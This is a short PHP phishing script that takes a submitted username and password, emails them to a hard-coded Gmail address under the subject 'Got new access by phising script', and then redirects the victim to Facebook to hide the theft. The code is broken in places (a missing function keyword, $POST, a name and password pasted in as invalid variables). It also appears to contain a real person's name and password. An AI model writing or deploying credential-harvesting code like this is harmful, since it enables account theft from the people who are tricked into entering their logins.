<?php
	mail_sender(){
		$username = $POST['username'];
		$password = $POST['password'];
		
		$reciever = "leonidaspramono@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $masyfiyatul fuadah;
		$message .= "and password is ". $sayang123;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
